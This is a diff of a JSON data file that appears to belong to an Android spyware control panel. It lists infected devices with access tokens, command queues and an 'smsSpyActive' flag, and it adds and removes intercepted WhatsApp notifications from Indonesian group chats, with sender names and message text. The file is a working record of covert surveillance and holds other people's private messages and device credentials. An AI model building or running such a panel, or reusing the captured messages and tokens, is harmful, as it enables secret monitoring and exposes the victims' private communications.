@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776776946625,
+    "lastSeen": 1776776952629,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3513 pesan dari 21 chat",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776949297
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (95 pesan): ~ JURAGAN RAIHAN MARKET OWNER CBN",
+        "content": "📷 Gb hasil pp nih mem aktf post akun udah 1rb kali op? 60+ aja",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776949274
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3512 pesan dari 21 chat",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776948257
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (953 pesan): ~ zunz",
@@ -10304,30 +10328,6 @@
         "time": "21/04 19:39",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775177001
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (72 pesan): diga",
-        "content": "Kalau ade",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775173225
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3684 pesan dari 23 chat",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775173208
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (71 pesan): diga",
-        "content": "Data yak an²",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775168843
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776776947296,
+    "lastSeen": 1776776950197,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776776946626,
+    "lastSeen": 1776776952627,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
